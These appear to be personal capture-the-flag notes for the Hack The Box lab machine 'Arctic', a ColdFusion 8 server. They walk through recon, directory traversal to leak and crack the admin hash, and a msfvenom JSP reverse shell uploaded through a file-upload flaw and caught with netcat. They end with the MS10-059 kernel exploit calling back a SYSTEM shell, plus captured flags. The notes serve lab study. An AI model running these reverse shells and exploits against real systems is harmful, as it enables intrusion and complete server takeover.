ARCTIC IP: 10.10.10.11


rustscan:

Open 10.10.10.11:135
Open 10.10.10.11:8500
Open 10.10.10.11:49154


nmap:
PORT      STATE SERVICE REASON  VERSION
135/tcp   open  msrpc   syn-ack Microsoft Windows RPC
8500/tcp  open  fmtp?   syn-ack
49154/tcp open  msrpc   syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

└─$ searchsploit coldfusion   
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                                                | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                                                             | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                                | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                                                                                 | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                                        | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                                                      | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                                                  | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                 | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                                                                                | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                                                          | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                                                                             | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                                                                                    | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                                                                          | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                                                                       | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scripting                                                    | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting                                                             | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting   

using 14641.py we can get the pasword of administrator account


#Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 encrypted=true

searching the hash on crackstation.net we find the pass: -> happyday

with this passwd we can log in as admin

going to the info section of the site we find following info

System Information
Server Details
Server Product	ColdFusion
Version	8,0,1,195765  
Edition	Developer  
Serial Number	Developer  
Operating System	Windows Vista  
OS Version	6.1  
JVM Details
Java Version	1.6.0_04  
Java Vendor	Sun Microsystems Inc.  
Java Vendor URL	http://java.sun.com/
Java Home	C:\ColdFusion8\runtime\jre  
Java File Encoding	Cp1253  
Java Default Locale	el_GR  
File Separator	\  
Path Separator	;  
Line Separator	Chr(13)
User Name	tolis  
User Home	C:\Users\tolis  
User Dir	C:\ColdFusion8\runtime\bin  
Java VM Specification Version	1.0  
Java VM Specification Vendor	Sun Microsystems Inc.  
Java VM Specification Name	Java Virtual Machine Specification  
Java VM Version	10.0-b19  
Java VM Vendor	Sun Microsystems Inc.  
Java VM Name	Java HotSpot(TM) 64-Bit Server VM  
Java Specification Version	1.6  
Java Specification Vendor	Sun Microsystems Inc.  
Java Specification Name	Java Platform API Specification  
Java Class Version	50.0  
Java Class Path	
CF Classpath
;C:/ColdFusion8/runtime/../lib/ant-launcher.jar;  C:/ColdFusion8/runtime/../lib/ant.jar;  C:/ColdFusion8/runtime/../lib/asn1.jar;  C:/ColdFusion8/runtime/../lib/axis.jar;  C:/ColdFusion8/runtime/../lib/backport-util-concurrent.jar;  C:/ColdFusion8/runtime/../lib/bcel.jar;  C:/ColdFusion8/runtime/../lib/cdo.jar;  C:/ColdFusion8/runtime/../lib/cdohost.jar;  C:/ColdFusion8/runtime/../lib/certj.jar;  C:/ColdFusion8/runtime/../lib/cf-acrobat.jar;  C:/ColdFusion8/runtime/../lib/cf-assembler.jar;  C:/ColdFusion8/runtime/../lib/cf-logging.jar;  C:/ColdFusion8/runtime/../lib/cf4was.jar;  C:/ColdFusion8/runtime/../lib/cf4was_ae.jar;  C:/ColdFusion8/runtime/../lib/cfusion-req.jar;  C:/ColdFusion8/runtime/../lib/cfusion.jar;  C:/ColdFusion8/runtime/../lib/clibwrapper_jiio.jar;  C:/ColdFusion8/runtime/../lib/commons-beanutils-1.6.jar;  C:/ColdFusion8/runtime/../lib/commons-codec-1.3.jar;  C:/ColdFusion8/runtime/../lib/commons-collections-2.1.jar;  C:/ColdFusion8/runtime/../lib/commons-digester-1.7.jar;  C:/ColdFusion8/runtime/../lib/commons-discovery-0.2.jar;  C:/ColdFusion8/runtime/../lib/commons-httpclient-3.0.1.jar;  C:/ColdFusion8/runtime/../lib/commons-logging-api.1.0.4.jar;  C:/ColdFusion8/runtime/../lib/commons-logging.1.0.4.jar;  C:/ColdFusion8/runtime/../lib/commons-net-1.4.0.jar;  C:/ColdFusion8/runtime/../lib/crystal.jar;  C:/ColdFusion8/runtime/../lib/derby.jar;  C:/ColdFusion8/runtime/../lib/derbyclient.jar;  C:/ColdFusion8/runtime/../lib/derbynet.jar;  C:/ColdFusion8/runtime/../lib/derbyrun.jar;  C:/ColdFusion8/runtime/../lib/derbytools.jar;  C:/ColdFusion8/runtime/../lib/FCSj.jar;  C:/ColdFusion8/runtime/../lib/flashgateway.jar;  C:/ColdFusion8/runtime/../lib/flex-messaging-common.jar;  C:/ColdFusion8/runtime/../lib/flex-messaging-opt.jar;  C:/ColdFusion8/runtime/../lib/flex-messaging-req.jar;  C:/ColdFusion8/runtime/../lib/flex-messaging.jar;  C:/ColdFusion8/runtime/../lib/httpclient.jar;  C:/ColdFusion8/runtime/../lib/ib6addonpatch.jar;  C:/ColdFusion8/runtime/../lib/ib6core.jar;  C:/ColdFusion8/runtime/../lib/ib6http.jar;  C:/ColdFusion8/runtime/../lib/ib6swing.jar;  C:/ColdFusion8/runtime/../lib/ib6util.jar;  C:/ColdFusion8/runtime/../lib/im.jar;  C:/ColdFusion8/runtime/../lib/iText.jar;  C:/ColdFusion8/runtime/../lib/iTextAsian.jar;  C:/ColdFusion8/runtime/../lib/izmado.jar;  C:/ColdFusion8/runtime/../lib/jai_codec.jar;  C:/ColdFusion8/runtime/../lib/jai_core.jar;  C:/ColdFusion8/runtime/../lib/jai_imageio.jar;  C:/ColdFusion8/runtime/../lib/jakarta-oro-2.0.6.jar;  C:/ColdFusion8/runtime/../lib/jakarta-slide-webdavlib-2.1.jar;  C:/ColdFusion8/runtime/../lib/java2wsdl.jar;  C:/ColdFusion8/runtime/../lib/jax-qname.jar;  C:/ColdFusion8/runtime/../lib/jaxb-api.jar;  C:/ColdFusion8/runtime/../lib/jaxb-impl.jar;  C:/ColdFusion8/runtime/../lib/jaxb-libs.jar;  C:/ColdFusion8/runtime/../lib/jaxb-xjc.jar;  C:/ColdFusion8/runtime/../lib/jaxrpc.jar;  C:/ColdFusion8/runtime/../lib/jdom-1.0.jar;  C:/ColdFusion8/runtime/../lib/jeb.jar;  C:/ColdFusion8/runtime/../lib/jintegra.jar;  C:/ColdFusion8/runtime/../lib/jnbcore.jar;  C:/ColdFusion8/runtime/../lib/jpedal.jar;  C:/ColdFusion8/runtime/../lib/jsch-0.1.28m.jar;  C:/ColdFusion8/runtime/../lib/jstack.jar;  C:/ColdFusion8/runtime/../lib/jutf7-0.9.0.jar;  C:/ColdFusion8/runtime/../lib/ldap.jar;  C:/ColdFusion8/runtime/../lib/ldapbp.jar;  C:/ColdFusion8/runtime/../lib/log4j-1.2.12.jar;  C:/ColdFusion8/runtime/../lib/macromedia_drivers.jar;  C:/ColdFusion8/runtime/../lib/mail.jar;  C:/ColdFusion8/runtime/../lib/metadata-extractor-2.2.2.jar;  C:/ColdFusion8/runtime/../lib/mlibwrapper_jai.jar;  C:/ColdFusion8/runtime/../lib/mm-mysql-jdbc.jar;  C:/ColdFusion8/runtime/../lib/msapps.jar;  C:/ColdFusion8/runtime/../lib/mysql-connector-java-commercial-5.0.5-bin.jar;  C:/ColdFusion8/runtime/../lib/namespace.jar;  C:/ColdFusion8/runtime/../lib/pdfencryption.jar;  C:/ColdFusion8/runtime/../lib/poi-2.5.1-final-20040804.jar;  C:/ColdFusion8/runtime/../lib/poi-contrib-2.5.1-final-20040804.jar;  C:/ColdFusion8/runtime/../lib/postgresql-8.1-407.jdbc3.jar;  C:/ColdFusion8/runtime/../lib/relaxngDatatype.jar;  C:/ColdFusion8/runtime/../lib/ri_generic.jar;  C:/ColdFusion8/runtime/../lib/rome-cf.jar;  C:/ColdFusion8/runtime/../lib/saaj.jar;  C:/ColdFusion8/runtime/../lib/smack.jar;  C:/ColdFusion8/runtime/../lib/smpp.jar;  C:/ColdFusion8/runtime/../lib/STComm.jar;  C:/ColdFusion8/runtime/../lib/tools.jar;  C:/ColdFusion8/runtime/../lib/tt-bytecode.jar;  C:/ColdFusion8/runtime/../lib/vadmin.jar;  C:/ColdFusion8/runtime/../lib/verity.jar;  C:/ColdFusion8/runtime/../lib/vparametric.jar;  C:/ColdFusion8/runtime/../lib/vsearch.jar;  C:/ColdFusion8/runtime/../lib/wc50.jar;  C:/ColdFusion8/runtime/../lib/webchartsJava2D.jar;  C:/ColdFusion8/runtime/../lib/wsdl2java.jar;  C:/ColdFusion8/runtime/../lib/wsdl4j-1.5.1.jar;  C:/ColdFusion8/runtime/../lib/xalan.jar;  C:/ColdFusion8/runtime/../lib/xercesImpl.jar;  C:/ColdFusion8/runtime/../lib/xml-apis.jar;  C:/ColdFusion8/runtime/../lib/xsdlib.jar;  C:/ColdFusion8/runtime/../lib/;  C:/ColdFusion8/runtime/../gateway/lib/examples.jar;  C:/ColdFusion8/runtime/../gateway/lib/;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/asc.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-awt-util.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-bridge.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-css.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-dom.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-ext.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-gvt.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-parser.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-script.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-svg-dom.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-svggen.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-transcoder.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-util.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/batik-xml.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/cfdataservicesadapter.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/cfgatewayadapter.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/concurrent.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/flex-acrobat.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/flex-webtier-jsp.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/flex-webtier.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/license.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/mm-velocity-1.4.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/mxmlc.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/oscache.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/swfkit.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/xercesImpl.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/xercesPatch.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/xmlParserAPIs.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/flex/jars/;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/batik-awt-util.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/batik-css.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/batik-ext.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/batik-transcoder.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/batik-util.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/commons-discovery.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/commons-logging.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/concurrent.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/flex.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/jakarta-oro-2.0.7.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/jcert.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/jnet.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/jsse.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/oscache.jar;  C:/ColdFusion8/runtime/../wwwroot/WEB-INF/cfform/jars/;  
Server Classpath
C:\ColdFusion8\runtime\servers\lib;
C:\ColdFusion8\runtime\servers\lib\jrun-patch.jar;
C:\ColdFusion8\runtime\..\lib\macromedia_drivers.jar;
C:\ColdFusion8\runtime\lib\cfmx_mbean.jar;
C:\ColdFusion8\runtime\lib;
C:\ColdFusion8\runtime\lib\cfmx_mbean.jar;
C:\ColdFusion8\runtime\lib\instutil.jar;
C:\ColdFusion8\runtime\lib\java2wsdl.jar;
C:\ColdFusion8\runtime\lib\jrun-ant-tasks.jar;
C:\ColdFusion8\runtime\lib\jrun-xdoclet.jar;
C:\ColdFusion8\runtime\lib\jrun.jar;
C:\ColdFusion8\runtime\lib\jspc.jar;
C:\ColdFusion8\runtime\lib\migrate.jar;
C:\ColdFusion8\runtime\lib\oem-xdoclet.jar;
C:\ColdFusion8\runtime\lib\sniffer.jar;
C:\ColdFusion8\runtime\lib\webservices.jar;
C:\ColdFusion8\runtime\lib\wsconfig.jar;
C:\ColdFusion8\runtime\lib\wsdl2java.jar;
C:\ColdFusion8\runtime\lib\xmlscript.jar;
C:\ColdFusion8\runtime\lib\jrun.jar

Java Ext Dirs	C:\ColdFusion8\runtime\jre\lib\ext;C:\Windows\Sun\Java\lib\ext  
Printer Details
Default Printer	Microsoft XPS Document Writer
Printers	Microsoft XPS Document Writer



create a jsp shell using msfvenom
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=444 > shell.jsp             
Payload size: 1496 bytes

using coldfusion_arbitrary_upload.py, upload the shell to the machine and catch it:

python coldfusion_arbitrary_upload.py 10.10.10.11 8500 shell.jsp 
Sending payload...
Successfully uploaded payload!
Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp


sudo nc -lvnp 444                 
[sudo] password for kali: 
listening on [any] 444 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.11] 49458
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>


User.txt: 39e090b9299843278f9a6ab189d4deba


PRIVESC:

C:\Users\tolis\Desktop>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          30/1/2023, 12:33:02 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.095 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.269 MB
Virtual Memory: In Use:    1.016 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11





we can use https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled for exploiting ms10-059

upload the file to the victim machine using the python script used above, with a minor change : CurrentFolder=/exploit.jsp turns in to CurrentFolder=/exploit.exe. Save the script and run it to upload the exploit.exe to the machine
python coldfusion_arbitrary_upload.py 10.10.10.11 8500 exploit.exe 
Sending payload...
Successfully uploaded payload!
Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp


start a nc listener, and then run the exploit on the victim machine

exploit.exe 10.10.14.14 4444


nc -lnvp 4444       
listening on [any] 4444 ...
id
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.11] 49523
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.


C:\ColdFusion8\wwwroot\userfiles\file>whoami
whoami
nt authority\system




root flag: 554dc2b645a0a8421a2fc6aa228ca4b2 